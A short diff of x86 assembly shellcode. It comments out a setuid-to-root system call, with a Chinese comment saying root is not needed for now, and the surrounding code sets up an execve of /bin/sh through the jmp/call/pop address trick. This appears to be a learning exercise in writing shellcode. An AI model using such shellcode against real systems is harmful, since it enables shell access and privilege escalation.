@@ -6,10 +6,10 @@ global _start
 		jmp two
 	; setuid
 	; 暂时并不需要获取 root 权限
-	xor eax, eax
-	mov al, 0d5H
-	xor ebx, ebx
-	int 80H
+	; xor eax, eax
+	; mov al, 0d5H
+	; xor ebx, ebx
+	; int 80H
 	; execve
 	one:	
 		pop ebx; get address of "/bin/sh"
